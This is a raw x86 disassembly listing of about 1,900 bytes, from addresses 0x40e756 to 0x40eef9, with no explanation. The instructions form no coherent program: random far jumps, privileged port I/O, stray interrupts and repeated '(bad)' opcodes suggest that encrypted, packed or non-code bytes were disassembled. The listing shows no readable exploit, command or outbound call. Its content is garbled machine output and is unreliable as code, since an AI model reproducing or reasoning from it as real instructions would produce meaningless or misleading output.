  40e756:	call   0x4b15:0x590bb820
  40e75d:	stos   BYTE PTR es:[edi],al
  40e75e:	int    0xdb
  40e760:	icebp  
  40e761:	std    
  40e762:	sbb    DWORD PTR [eax],0x20
  40e765:	mov    DWORD PTR [ebx-0x6],ecx
  40e768:	jmp    0xce496cff
  40e76d:	dec    edi
  40e76e:	sahf   
  40e76f:	cwde   
  40e770:	repnz lock pop esi
  40e773:	loopne 0x40e7b5
  40e775:	ds in  al,dx
  40e777:	mov    bl,ch
  40e779:	fistp  WORD PTR [edx]
  40e77b:	in     al,dx
  40e77c:	xchg   ebp,eax
  40e77d:	mov    edi,0x26b67d2f
  40e782:	test   DWORD PTR [bp-0x64],0xc96a35ba
  40e78a:	add    edi,DWORD PTR [esi]
  40e78c:	push   ecx
  40e78d:	jmp    0xc85a:0xa24049cc
  40e794:	add    DWORD PTR [ebx-0x59],edi
  40e797:	sub    eax,0x5b62a597
  40e79c:	xlat   BYTE PTR ds:[ebx]
  40e79d:	out    dx,eax
  40e79e:	loop   0x40e744
  40e7a0:	jns    0x40e808
  40e7a2:	test   DWORD PTR [esp+eax*8+0x5f],edi
  40e7a6:	mov    ebx,0x2bcc2bc6
  40e7ab:	shr    DWORD PTR [ebp+0x7fa54c12],0x49
  40e7b2:	jecxz  0x40e74d
  40e7b4:	dec    edi
  40e7b5:	mov    dl,0x75
  40e7b7:	and    DWORD PTR ds:0x952e8006,ebx
  40e7bd:	xchg   ebp,eax
  40e7be:	out    0xd7,al
  40e7c0:	sub    al,0x43
  40e7c2:	test   eax,0xa07c3c59
  40e7c7:	retf   0x792
  40e7ca:	and    eax,0x400b8062
  40e7cf:	adc    cl,BYTE PTR [edi+0x6c]
  40e7d2:	xchg   ecx,eax
  40e7d3:	add    ah,BYTE PTR [esi]
  40e7d5:	push   eax
  40e7d6:	je     0x40e789
  40e7d8:	rol    esp,1
  40e7da:	cs jmp 0xf7fa:0x21162db5
  40e7e2:	pop    esp
  40e7e3:	pop    ecx
  40e7e4:	xchg   ebx,eax
  40e7e5:	jp     0x40e7c8
  40e7e7:	mov    ah,0x3c
  40e7e9:	pop    es
  40e7ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7eb:	inc    edi
  40e7ec:	inc    esp
  40e7ed:	iret   
  40e7ee:	or     cl,bh
  40e7f0:	retf   0xae4b
  40e7f3:	adc    ch,BYTE PTR [edi+eax*4-0x19ac843d]
  40e7fa:	fmul   DWORD PTR [ecx]
  40e7fc:	mov    dh,0xf0
  40e7fe:	jge    0x40e7b6
  40e800:	mov    bh,0x67
  40e802:	jne    0x40e79d
  40e804:	scas   eax,DWORD PTR es:[edi]
  40e805:	or     bl,bl
  40e807:	sub    DWORD PTR [eax],0xffffffb4
  40e80a:	sub    BYTE PTR [esi],dh
  40e80c:	and    al,0xeb
  40e80e:	xor    eax,0x39743657
  40e813:	fdivr  DWORD PTR [ecx-0x76]
  40e816:	mov    ecx,0xe7da5532
  40e81b:	lods   al,BYTE PTR ds:[esi]
  40e81c:	ffreep st(4)
  40e81e:	mov    ebx,0x1b7fd9bc
  40e823:	or     eax,0x4f147513
  40e828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e829:	mov    ds:0xeddd438d,eax
  40e82e:	mov    dh,BYTE PTR [ebx+0x26]
  40e831:	push   ecx
  40e832:	or     al,0x6f
  40e834:	in     al,dx
  40e835:	and    BYTE PTR [ebx+0x5f],dh
  40e838:	push   ds
  40e839:	or     edx,eax
  40e83b:	push   edi
  40e83c:	dec    edx
  40e83d:	leave  
  40e83e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e83f:	or     al,0xc3
  40e841:	fsub   QWORD PTR [esi+edi*4+0x3cad3f9b]
  40e848:	cs fwait
  40e84a:	sub    DWORD PTR [esi-0x242613d7],esi
  40e850:	out    dx,al
  40e851:	and    al,0x32
  40e853:	mov    ecx,0x3a65d723
  40e858:	mov    eax,ds:0x6eb8c727
  40e85d:	repnz das 
  40e85f:	stos   DWORD PTR es:[edi],eax
  40e860:	jmp    0xb79d:0x98bff1d2
  40e867:	lea    edi,[eax-0x5ed5ce4d]
  40e86d:	stos   DWORD PTR es:[edi],eax
  40e86e:	aas    
  40e86f:	xchg   esi,eax
  40e870:	shl    BYTE PTR ds:0xd12a5da8,0x84
  40e877:	mov    edi,0xe2a4e4e5
  40e87c:	lea    ecx,[edi+0x48ca4cc0]
  40e882:	xchg   ebp,eax
  40e883:	dec    edi
  40e884:	iret   
  40e885:	iret   
  40e886:	iret   
  40e887:	xchg   BYTE PTR [edx-0x593d60ff],dh
  40e88d:	inc    ah
  40e88f:	ins    DWORD PTR es:[edi],dx
  40e890:	fimul  WORD PTR [edx+0x2a893439]
  40e896:	(bad)  [esi]
  40e898:	test   BYTE PTR [ecx-0x125371a9],dh
  40e89e:	jmp    0x40e902
  40e8a0:	pop    ecx
  40e8a1:	xlat   BYTE PTR ds:[ebx]
  40e8a2:	cmc    
  40e8a3:	add    ah,0x82
  40e8a6:	or     al,0x2
  40e8a8:	not    DWORD PTR [edx+0x14a36a27]
  40e8ae:	push   ds
  40e8af:	push   edx
  40e8b0:	xor    al,0xd2
  40e8b2:	mov    BYTE PTR [ebx],al
  40e8b4:	sbb    BYTE PTR [edx+0x4f],al
  40e8b7:	ret    0xfc1e
  40e8ba:	sub    eax,0x475cfd0c
  40e8bf:	mov    al,0x25
  40e8c1:	(bad)  
  40e8c2:	dec    esi
  40e8c3:	sbb    BYTE PTR [edx],dl
  40e8c5:	cmp    dh,dl
  40e8c7:	push   ds
  40e8c8:	and    al,0xf8
  40e8ca:	stos   DWORD PTR es:[edi],eax
  40e8cb:	push   ebx
  40e8cc:	pusha  
  40e8cd:	in     al,0xdb
  40e8cf:	mov    edx,0x90471dac
  40e8d4:	mov    al,ds:0x24f90f34
  40e8d9:	dec    ebp
  40e8da:	out    dx,al
  40e8db:	inc    ebx
  40e8dc:	int    0x7d
  40e8de:	xor    al,0xef
  40e8e0:	sub    ebp,DWORD PTR [ecx+0x728e8a73]
  40e8e6:	pop    ecx
  40e8e7:	adc    eax,0x552a2fbb
  40e8ec:	ret    
  40e8ed:	inc    eax
  40e8ee:	pop    eax
  40e8ef:	add    ax,0xe2fd
  40e8f3:	lods   eax,DWORD PTR ds:[esi]
  40e8f4:	pop    ss
  40e8f5:	adc    esp,DWORD PTR [edx]
  40e8f7:	popf   
  40e8f8:	cwde   
  40e8f9:	pop    ss
  40e8fa:	inc    ecx
  40e8fb:	sbb    ebx,edx
  40e8fd:	cld    
  40e8fe:	mov    ebx,?
  40e900:	(bad)  
  40e901:	ds xor al,0xbb
  40e904:	cmp    DWORD PTR [ebx],eax
  40e906:	repnz adc ah,bh
  40e909:	icebp  
  40e90a:	sbb    al,0x2c
  40e90c:	mov    dh,ch
  40e90e:	pop    edx
  40e90f:	fidivr DWORD PTR [ebx+0x54]
  40e912:	jg     0x40e924
  40e914:	adc    ecx,DWORD PTR ds:0x60166488
  40e91a:	lahf   
  40e91b:	push   edx
  40e91c:	push   0x76
  40e91e:	and    ebp,DWORD PTR [edx-0x1b]
  40e921:	or     DWORD PTR [esi-0x22],ecx
  40e924:	mov    ch,0x80
  40e926:	aaa    
  40e927:	and    eax,0xed540690
  40e92c:	ds push edx
  40e92e:	inc    esp
  40e92f:	jmp    0x8871:0x3bad84c3
  40e936:	mov    ds:0x1a7045b9,eax
  40e93b:	addr16 pop ebp
  40e93d:	retf   
  40e93e:	xor    DWORD PTR [eax],eax
  40e940:	adc    esp,DWORD PTR [ebp+0x41c2576a]
  40e946:	mov    ch,0x66
  40e948:	jae    0x40e8cb
  40e94a:	es ret 0xe392
  40e94e:	daa    
  40e94f:	sub    al,0x15
  40e951:	outs   dx,BYTE PTR ds:[esi]
  40e952:	cmp    BYTE PTR [edi+0x43590ef3],bh
  40e958:	and    bl,dh
  40e95a:	in     al,0xaa
  40e95c:	mov    ch,0xef
  40e95e:	lds    esi,FWORD PTR [esi+0x12]
  40e961:	inc    ebx
  40e962:	ror    DWORD PTR [ecx],1
  40e964:	out    dx,eax
  40e965:	mov    dh,0xca
  40e967:	mov    ah,0x9f
  40e969:	sahf   
  40e96a:	stos   BYTE PTR es:[edi],al
  40e96b:	iret   
  40e96c:	xchg   edx,eax
  40e96d:	and    al,0xe6
  40e96f:	hlt    
  40e970:	jbe    0x40e983
  40e972:	es iret 
  40e974:	pop    ds
  40e975:	stos   BYTE PTR es:[edi],al
  40e976:	loopne 0x40e92b
  40e978:	mov    ebx,0x3dfdefa
  40e97d:	(bad)  
  40e97e:	jnp    0x40e98b
  40e980:	cli    
  40e981:	stc    
  40e982:	dec    esp
  40e983:	imul   ebx,edx,0x16e43b09
  40e989:	imul   edi,DWORD PTR [esi-0x59],0xffffffb5
  40e98d:	cmp    eax,0x3a666f0c
  40e993:	cmp    edi,DWORD PTR [ebp+0x1b7a29ec]
  40e999:	das    
  40e99a:	xchg   esi,eax
  40e99b:	pop    ebp
  40e99c:	leave  
  40e99d:	mov    dl,0x5a
  40e99f:	push   esi
  40e9a0:	pusha  
  40e9a1:	mov    esp,0xc1283900
  40e9a6:	sub    al,0x5c
  40e9a8:	or     ebp,DWORD PTR [esi]
  40e9aa:	pop    ds
  40e9ab:	outs   dx,BYTE PTR ds:[esi]
  40e9ac:	leave  
  40e9ad:	cs stos DWORD PTR es:[edi],eax
  40e9af:	(bad)  
  40e9b0:	jmp    0x6c0e:0x164b9837
  40e9b7:	daa    
  40e9b8:	add    DWORD PTR [ebp-0x71],esi
  40e9bb:	adc    bh,BYTE PTR [esi+0x45]
  40e9be:	xchg   edi,eax
  40e9bf:	mov    ah,0x82
  40e9c1:	and    ah,dh
  40e9c3:	iret   
  40e9c4:	sub    al,cl
  40e9c6:	inc    edx
  40e9c7:	outs   dx,BYTE PTR ds:[esi]
  40e9c8:	mov    edx,0x2b871995
  40e9cd:	xchg   BYTE PTR [esi],dl
  40e9cf:	sub    BYTE PTR [esi-0x300a2ed3],dl
  40e9d5:	mov    al,0x8e
  40e9d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9d8:	and    dh,BYTE PTR [ebx-0x68bfcfe4]
  40e9de:	and    eax,0x773cec31
  40e9e3:	jle    0x40e9e4
  40e9e5:	arpl   WORD PTR ds:0x58e51f39,cx
  40e9eb:	int    0xcd
  40e9ed:	(bad)  
  40e9ee:	jns    0x40e9af
  40e9f0:	mov    DWORD PTR [ecx],0x60df22c2
  40e9f6:	and    ax,0xf119
  40e9fa:	xor    DWORD PTR [edi+eiz*8],0x1b9dbc80
  40ea01:	cmp    al,0xdf
  40ea03:	mov    bh,0x8b
  40ea05:	jmp    0x196b:0x377eefe8
  40ea0c:	xchg   ebx,eax
  40ea0d:	addr16 jno 0x40ea2e
  40ea10:	push   ebp
  40ea11:	mov    ebx,0xfdddc67c
  40ea16:	scas   al,BYTE PTR es:[edi]
  40ea17:	data16 jnp 0x40ea0c
  40ea1a:	dec    edi
  40ea1b:	nop
  40ea1c:	dec    ebp
  40ea1d:	cmp    eax,0x3da1a0a2
  40ea22:	stos   BYTE PTR es:[edi],al
  40ea23:	leave  
  40ea24:	fisttp DWORD PTR [edx+0x1e]
  40ea27:	adc    eax,0x1c5f2657
  40ea2c:	cli    
  40ea2d:	mov    DWORD PTR [edi-0x650fd6c4],0x9705435a
  40ea37:	in     eax,dx
  40ea38:	cmp    esi,DWORD PTR ds:0x654eff5b
  40ea3e:	sbb    edx,DWORD PTR [edi+0x3dae6a97]
  40ea44:	repnz aas 
  40ea46:	add    ch,BYTE PTR [edx]
  40ea48:	outs   dx,BYTE PTR ds:[esi]
  40ea49:	es ds add al,0xd5
  40ea4d:	xchg   esi,eax
  40ea4e:	int3   
  40ea4f:	test   al,0x73
  40ea51:	xor    ebp,DWORD PTR [ecx-0x5662d13d]
  40ea57:	sbb    dl,bl
  40ea59:	mov    cl,0x57
  40ea5b:	adc    DWORD PTR [ecx-0x7de2438c],ebp
  40ea61:	sub    DWORD PTR [ebp-0xed78cd6],0xfffffff4
  40ea68:	sbb    BYTE PTR [ecx+eiz*1+0x29f58044],bh
  40ea6f:	scas   eax,DWORD PTR es:[edi]
  40ea70:	shl    DWORD PTR [esi],cl
  40ea72:	mov    fs,WORD PTR [ecx]
  40ea74:	add    edx,edx
  40ea76:	arpl   WORD PTR [edx],bp
  40ea78:	xchg   edx,eax
  40ea79:	cmp    bh,al
  40ea7b:	call   0x60e66e6b
  40ea80:	mov    eax,ds:0xc74326c4
  40ea86:	and    ebx,DWORD PTR [ebp+edi*4+0x52]
  40ea8a:	ins    DWORD PTR es:[edi],dx
  40ea8b:	dec    edi
  40ea8c:	fwait
  40ea8d:	pop    esi
  40ea8e:	scas   al,BYTE PTR es:[edi]
  40ea8f:	iret   
  40ea90:	push   edi
  40ea91:	lock or ch,cl
  40ea94:	xchg   DWORD PTR [eax-0x19591489],ecx
  40ea9a:	xor    eax,0x96b266
  40ea9f:	pop    ds
  40eaa0:	bound  ebp,QWORD PTR [edi+0x41]
  40eaa3:	xchg   edx,eax
  40eaa4:	call   0x19418134
  40eaa9:	add    esp,esi
  40eaab:	into   
  40eaac:	rcr    ebp,cl
  40eaae:	mov    esi,0xb6722dc2
  40eab3:	sti    
  40eab4:	jle    0x40eb0f
  40eab6:	push   ebx
  40eab7:	xchg   BYTE PTR [ebx+0x63],bl
  40eaba:	aas    
  40eabb:	lods   al,BYTE PTR ds:[esi]
  40eabc:	mov    ds:0x74a0aa8,eax
  40eac1:	inc    ebp
  40eac2:	and    DWORD PTR [edi-0x374cc616],edi
  40eac8:	rol    BYTE PTR [ebp-0x6c97776],cl
  40eace:	push   esi
  40eacf:	add    DWORD PTR [ebx-0x17],0xe696a8f
  40ead6:	sub    BYTE PTR es:[esi],bl
  40ead9:	(bad)
  40eadc:	dec    ecx
  40eadd:	mov    ebp,0x6a2b5540
  40eae2:	dec    eax
  40eae3:	push   edx
  40eae4:	pop    ebx
  40eae5:	shl    BYTE PTR [ebp-0x7c],1
  40eae8:	in     eax,dx
  40eae9:	sub    esp,ecx
  40eaeb:	and    WORD PTR [eax+edi*1+0x57a445e7],cx
  40eaf3:	daa    
  40eaf4:	out    0xb0,al
  40eaf6:	xor    eax,0x4afc7943
  40eafb:	into   
  40eafc:	popaw  
  40eafe:	sbb    al,0x3b
  40eb00:	add    cl,BYTE PTR [edx-0x34ad1910]
  40eb06:	mov    WORD PTR [esi-0x189fc15c],ss
  40eb0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb0d:	sub    BYTE PTR [bx+di-0x7546],dl
  40eb12:	pop    ebx
  40eb13:	sbb    BYTE PTR [edx],cl
  40eb15:	xchg   BYTE PTR [esi-0x48],bl
  40eb18:	inc    BYTE PTR [eax+edi*2-0x538ed44f]
  40eb1f:	dec    eax
  40eb20:	xchg   esp,eax
  40eb21:	(bad)  
  40eb22:	sti    
  40eb23:	gs in  al,0xb9
  40eb26:	scas   eax,DWORD PTR es:[edi]
  40eb27:	mov    bh,0x31
  40eb29:	jo     0x40eae3
  40eb2b:	xor    ebx,DWORD PTR [edi+ecx*2]
  40eb2e:	mov    ecx,0xd62e2e46
  40eb33:	rcr    BYTE PTR [ebx+0x35],cl
  40eb36:	into   
  40eb37:	mov    al,0xb5
  40eb39:	jbe    0x40eba4
  40eb3b:	inc    edi
  40eb3c:	(bad)  
  40eb3d:	mov    ebp,0xe147feb2
  40eb42:	in     al,0x37
  40eb44:	neg    BYTE PTR [ecx+0x3f]
  40eb47:	das    
  40eb48:	jmp    0x4085:0x1bd0b461
  40eb4f:	sub    eax,0xff15dc3d
  40eb54:	in     al,0x9d
  40eb56:	lods   al,BYTE PTR ds:[esi]
  40eb57:	cmp    eax,0xfe0e8ac7
  40eb5c:	fs pop eax
  40eb5e:	repz or ebp,ebp
  40eb61:	pop    es
  40eb62:	repz enter 0x547,0xef
  40eb67:	xor    BYTE PTR [ecx+0x2920df57],0x24
  40eb6e:	cmp    eax,0xaa98dedc
  40eb73:	pop    ds
  40eb74:	jne    0x40eb3e
  40eb76:	sti    
  40eb77:	mov    ecx,0x3c09ca18
  40eb7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb7d:	jo     0x40eb09
  40eb7f:	mov    al,ds:0xf929135a
  40eb84:	xchg   DWORD PTR ds:0xfae6c046,edx
  40eb8a:	adc    bl,dh
  40eb8c:	or     BYTE PTR [eax+edx*4],bl
  40eb8f:	xchg   ecx,eax
  40eb90:	mov    es,WORD PTR [ebp+0x220afee0]
  40eb96:	call   0xeb40584e
  40eb9b:	fist   WORD PTR ds:0x5bb0c2ee
  40eba1:	add    al,0x13
  40eba3:	fnsave [ecx*8+0x1beb6dd5]
  40ebaa:	sbb    bl,BYTE PTR [edi-0x62]
  40ebad:	and    al,0x2a
  40ebaf:	clc    
  40ebb0:	xlat   BYTE PTR ds:[ebx]
  40ebb1:	shl    DWORD PTR [edi-0x3bc6a8d4],cl
  40ebb7:	mov    esi,0xddaaac0c
  40ebbc:	push   0xffffffe8
  40ebbe:	push   edx
  40ebbf:	je     0x40ec36
  40ebc1:	cwde   
  40ebc2:	cmp    DWORD PTR [ecx+0x59],edi
  40ebc5:	mov    eax,ds:0xeb3f410b
  40ebca:	ss je  0x40ec10
  40ebcd:	(bad)  
  40ebce:	mov    edi,0x8d7ee38b
  40ebd4:	sub    BYTE PTR [eax+edi*1-0x78e174c0],dh
  40ebdb:	mov    ah,0xc2
  40ebdd:	pusha  
  40ebde:	add    esi,edi
  40ebe0:	popa   
  40ebe1:	int    0xa4
  40ebe3:	push   ss
  40ebe4:	sbb    ecx,0x7
  40ebe7:	xchg   esi,eax
  40ebe8:	ins    DWORD PTR es:[edi],dx
  40ebe9:	mov    BYTE PTR [ebp+0xf0b94a0],dh
  40ebef:	jns    0x40ec48
  40ebf1:	daa    
  40ebf2:	mov    ds:0x6518c9b,eax
  40ebf7:	mov    DWORD PTR [eax+0x42f5352],ebx
  40ebfd:	sub    dl,dl
  40ebff:	jnp    0x40eb96
  40ec01:	mov    eax,0xca269a16
  40ec06:	hlt    
  40ec07:	add    esp,DWORD PTR [edx+0x4bbfbef2]
  40ec0d:	mov    ds:0xf5e7264e,al
  40ec12:	cmp    al,BYTE PTR [esp+esi*8+0x1af3301a]
  40ec19:	ficomp DWORD PTR [eax+ecx*8+0x3b7a2a71]
  40ec20:	pop    ecx
  40ec21:	xor    esp,ebp
  40ec23:	mov    ds:0x87846694,eax
  40ec28:	daa    
  40ec29:	xor    ebp,DWORD PTR [esi+ebp*4-0x563f84d0]
  40ec30:	rol    BYTE PTR ds:0x558d53d3,0xff
  40ec37:	inc    ebp
  40ec38:	mov    al,ds:0xbfff1203
  40ec3d:	dec    edi
  40ec3e:	adc    al,0x55
  40ec40:	int    0xd9
  40ec42:	std    
  40ec43:	stos   BYTE PTR es:[edi],al
  40ec44:	sub    ecx,DWORD PTR [edx+0x27beaf3f]
  40ec4a:	cwde   
  40ec4b:	push   ebp
  40ec4c:	xchg   esi,eax
  40ec4d:	mov    dl,0x37
  40ec4f:	lahf   
  40ec50:	data16 imul BYTE PTR [edi-0x3a2af2a8]
  40ec57:	sti    
  40ec58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec59:	loop   0x40ecd5
  40ec5b:	loop   0x40ecc4
  40ec5d:	dec    ecx
  40ec5e:	retf   
  40ec5f:	xchg   esi,eax
  40ec60:	jg     0x40ebe8
  40ec62:	pop    ds
  40ec63:	enter  0x143,0xac
  40ec67:	call   0x2a26feb
  40ec6c:	sti    
  40ec6d:	and    eax,0xd54ee430
  40ec72:	dec    edx
  40ec73:	aad    0xc5
  40ec75:	test   DWORD PTR [edi+0x76cd6784],ebp
  40ec7b:	pop    ss
  40ec7c:	fsin   
  40ec7e:	mov    ah,0x84
  40ec80:	test   BYTE PTR [ebp+0x52],bl
  40ec83:	sahf   
  40ec84:	mov    ebx,0xf9a2746b
  40ec89:	mov    ch,0xe
  40ec8b:	xchg   ebp,eax
  40ec8c:	mov    WORD PTR [ebx],ss
  40ec8e:	pop    ebp
  40ec8f:	arpl   WORD PTR [ebx],bp
  40ec91:	lods   eax,DWORD PTR ds:[esi]
  40ec92:	ins    BYTE PTR es:[edi],dx
  40ec93:	and    BYTE PTR [ebx-0x669bd3be],bl
  40ec99:	neg    DWORD PTR [esi+0xa581702]
  40ec9f:	sbb    eax,0xebf9f562
  40eca4:	xor    BYTE PTR [edi-0x4c86a3dd],al
  40ecaa:	sub    DWORD PTR [ebx+0x28],0x12
  40ecae:	pop    ss
  40ecaf:	adc    ch,dh
  40ecb1:	sbb    BYTE PTR [edi],dh
  40ecb3:	sar    eax,cl
  40ecb5:	xor    ah,al
  40ecb7:	jp     0x40ec71
  40ecb9:	out    dx,al
  40ecba:	mov    al,0x7
  40ecbc:	dec    edx
  40ecbd:	or     BYTE PTR [eax],ah
  40ecbf:	(bad)  
  40ecc0:	pushf  
  40ecc1:	out    0x32,al
  40ecc3:	mov    BYTE PTR [ebx-0x1f],cl
  40ecc6:	sbb    ebx,DWORD PTR [ebx+0x35c00a42]
  40eccc:	jae    0x40eca3
  40ecce:	retf   0x9589
  40ecd1:	dec    edi
  40ecd2:	test   DWORD PTR [ecx+0x40],esp
  40ecd5:	cmp    ah,BYTE PTR [edi]
  40ecd7:	and    BYTE PTR [eax-0x1cbe78f7],0x60
  40ecde:	(bad)  
  40ecdf:	cmp    al,0x8a
  40ece1:	push   eax
  40ece2:	ret    0x8ab3
  40ece5:	lahf   
  40ece6:	setnp  BYTE PTR [edx]
  40ece9:	std    
  40ecea:	div    BYTE PTR [ebx]
  40ecec:	xor    BYTE PTR [esi],0xae
  40ecef:	pop    eax
  40ecf0:	into   
  40ecf1:	outs   dx,BYTE PTR ds:[esi]
  40ecf2:	nop
  40ecf3:	cmp    eax,0x3dd45b89
  40ecf8:	(bad)  
  40ecf9:	adc    eax,0x5e7fc4de
  40ecfe:	inc    edi
  40ecff:	adc    eax,DWORD PTR [edi-0x6f]
  40ed02:	jbe    0x40ed46
  40ed04:	pop    es
  40ed05:	and    al,BYTE PTR [ebp+0x1d]
  40ed08:	nop
  40ed09:	jae    0x40ed50
  40ed0b:	cmp    eax,0x49d1b113
  40ed10:	mov    eax,esp
  40ed12:	imul   ebx,DWORD PTR [esi+0x3553fa56],0x29
  40ed19:	add    esp,esi
  40ed1b:	jno    0x40ecde
  40ed1d:	push   cs
  40ed1e:	mov    ds:0x38879b2,al
  40ed23:	popf   
  40ed24:	stc    
  40ed25:	jne    0x40ed1e
  40ed27:	or     bh,dh
  40ed29:	fist   DWORD PTR [ecx+0x27]
  40ed2c:	(bad)  
  40ed2d:	int    0xd6
  40ed2f:	pop    DWORD PTR [ecx+0x16]
  40ed32:	ret    0xe7f
  40ed35:	cmp    eax,0x975f310f
  40ed3a:	lds    edi,FWORD PTR [esi-0x75da7443]
  40ed40:	arpl   WORD PTR [esp+ebp*8-0x6470806b],si
  40ed47:	out    0x55,al
  40ed49:	xor    BYTE PTR [eax+0x70],dl
  40ed4c:	imul   esp,DWORD PTR [eax-0x72],0xfffffff8
  40ed50:	(bad)  
  40ed51:	adc    ebx,DWORD PTR [edx+0x3c]
  40ed54:	pop    esp
  40ed55:	and    BYTE PTR [ebx-0x2992326f],al
  40ed5b:	test   DWORD PTR [ebp+eiz*1-0x48fc9c79],esp
  40ed62:	lods   al,BYTE PTR ds:[esi]
  40ed63:	ja     0x40ecf2
  40ed65:	xor    eax,0xb2b941ee
  40ed6a:	loopne 0x40ecf2
  40ed6c:	fld    st(5)
  40ed6e:	cmp    al,0xe2
  40ed70:	and    BYTE PTR [eax],dh
  40ed72:	and    bl,BYTE PTR [ecx-0x63]
  40ed75:	and    al,0x88
  40ed77:	cli    
  40ed78:	jns    0x40edd3
  40ed7a:	jb     0x40ed88
  40ed7c:	sbb    BYTE PTR [edx+0x2116a2f0],bl
  40ed82:	fst    DWORD PTR [edx]
  40ed84:	fadd   QWORD PTR ss:[eax+edi*2+0x22ecf44a]
  40ed8c:	loopne 0x40ee05
  40ed8e:	push   esi
  40ed8f:	cmp    eax,0x4e2249f5
  40ed94:	push   0x375d08fc
  40ed99:	or     al,0x14
  40ed9b:	cli    
  40ed9c:	nop
  40ed9d:	or     al,0xc0
  40ed9f:	xor    esi,DWORD PTR [ecx-0x43]
  40eda2:	mov    BYTE PTR [esi+eiz*8-0x18823d17],cl
  40eda9:	js     0x40ed7f
  40edab:	sahf   
  40edac:	mov    edx,0x316a80e4
  40edb1:	sbb    eax,0x89f684f9
  40edb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edb7:	xor    al,0x7
  40edb9:	mov    BYTE PTR [edx-0x5d],bh
  40edbc:	out    dx,al
  40edbd:	iret   
  40edbe:	shr    DWORD PTR [ebp+0x5e],1
  40edc1:	xor    eax,0x4c4d2b38
  40edc6:	sub    ebp,ebx
  40edc8:	ror    DWORD PTR [ebx+0x53438a97],0x9b
  40edcf:	shr    BYTE PTR [edx+0x17016bf],0xf5
  40edd6:	outs   dx,DWORD PTR ds:[esi]
  40edd7:	popa   
  40edd8:	fwait
  40edd9:	jns    0x40ede2
  40eddb:	adc    DWORD PTR [eax-0x4e],eax
  40edde:	ror    DWORD PTR [esi],cl
  40ede0:	loop   0x40ed9f
  40ede2:	mov    edi,0xc9580747
  40ede7:	xlat   BYTE PTR ds:[ebx]
  40ede8:	jbe    0x40ee5b
  40edea:	popf   
  40edeb:	xchg   edi,eax
  40edec:	loope  0x40edde
  40edee:	mov    WORD PTR [ebx],ss
  40edf0:	push   0x376c83ad
  40edf5:	repnz ds in eax,0xfc
  40edf9:	test   bl,0x8
  40edfc:	repnz pop ebx
  40edfe:	fmul   DWORD PTR [ebx+0x7457f231]
  40ee04:	leave  
  40ee05:	mov    ch,0xeb
  40ee07:	(bad)  
  40ee08:	jmp    DWORD PTR [eax]
  40ee0a:	push   esp
  40ee0b:	out    dx,al
  40ee0c:	xor    bh,dh
  40ee0e:	jb     0x40ee21
  40ee10:	add    al,0xb8
  40ee12:	push   0xffffff83
  40ee14:	xor    dh,BYTE PTR [ebx+0x612f3971]
  40ee1a:	ret    
  40ee1b:	mov    DWORD PTR ds:0xa139ff7c,eax
  40ee21:	call   0x747405ed
  40ee26:	es inc ebp
  40ee28:	cmp    edi,DWORD PTR [edi]
  40ee2a:	push   ecx
  40ee2b:	mov    ebx,0x9b0b3b0f
  40ee30:	add    BYTE PTR [edi-0x6d],0x68
  40ee34:	xchg   ebp,eax
  40ee35:	mov    ecx,0xad8af5da
  40ee3a:	cmp    edi,ebx
  40ee3c:	cmp    eax,DWORD PTR [ecx]
  40ee3e:	pop    ebp
  40ee3f:	popa   
  40ee40:	mov    BYTE PTR [ecx+0x19f03c46],0x8d
  40ee47:	pop    esp
  40ee48:	xor    ch,BYTE PTR [eax]
  40ee4a:	cwde   
  40ee4b:	icebp  
  40ee4c:	and    esp,DWORD PTR [ebp+0x15]
  40ee4f:	ins    BYTE PTR es:[edi],dx
  40ee50:	test   BYTE PTR [ecx],ah
  40ee52:	adc    ebp,DWORD PTR [ecx-0x24]
  40ee55:	pop    ss
  40ee56:	fwait
  40ee57:	xor    BYTE PTR [ebp+0x57689c2f],ah
  40ee5d:	or     DWORD PTR [ecx+0x47],edi
  40ee60:	sub    BYTE PTR [eax-0x39],0x41
  40ee64:	shr    DWORD PTR [eax],cl
  40ee66:	pop    edx
  40ee67:	push   0x6d
  40ee69:	jnp    0x40eecc
  40ee6b:	fcmovbe st,st(1)
  40ee6d:	sbb    DWORD PTR ds:0x89686807,ecx
  40ee73:	out    0x88,al
  40ee75:	cmp    DWORD PTR [ebp+0x767b830],0x3b838620
  40ee7f:	pusha  
  40ee80:	call   FWORD PTR [ebp-0xf]
  40ee83:	add    DWORD PTR [ecx],eax
  40ee85:	loope  0x40ee46
  40ee87:	enter  0x895b,0xcd
  40ee8b:	or     BYTE PTR [edi+0x1f6b9c8e],al
  40ee91:	retf   0x51e5
  40ee94:	test   DWORD PTR [ebx],esi
  40ee96:	call   0x20d3:0x2619f836
  40ee9d:	cmp    al,BYTE PTR [edi+0x1fcce92]
  40eea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eea4:	mov    edx,0x6a66611a
  40eea9:	jle    0x40ee6c
  40eeab:	enter  0x8f26,0x9f
  40eeaf:	jnp    0x40ef28
  40eeb1:	nop
  40eeb2:	mov    ds:0x585f3798,eax
  40eeb7:	or     eax,0xe66dc726
  40eebc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eebd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eebe:	arpl   WORD PTR [edi+0x4c],di
  40eec1:	daa    
  40eec2:	dec    esi
  40eec3:	mov    al,ds:0x7b228ba2
  40eec8:	cdq    
  40eec9:	sbb    DWORD PTR [eax],esp
  40eecb:	cmp    bl,cl
  40eecd:	push   eax
  40eece:	dec    ebx
  40eecf:	(bad)  
  40eed0:	retf   
  40eed1:	popf   
  40eed2:	mov    ds:0xccefe720,al
  40eed7:	out    0x2b,eax
  40eed9:	and    dh,BYTE PTR [ebx-0x1ba812a8]
  40eedf:	xchg   ebx,eax
  40eee0:	arpl   ax,bp
  40eee2:	call   0x21fa32db
  40eee7:	pop    ds
  40eee8:	pop    ds
  40eee9:	ficom  WORD PTR [ecx+esi*2]
  40eeec:	(bad)  
  40eeed:	or     al,al
  40eeef:	pmaddwd mm1,mm1
  40eef2:	sbb    al,0x91
  40eef4:	sti    
  40eef5:	(bad)  
  40eef6:	mov    bh,0xde
  40eef8:	lahf   
  40eef9:	out    dx,al
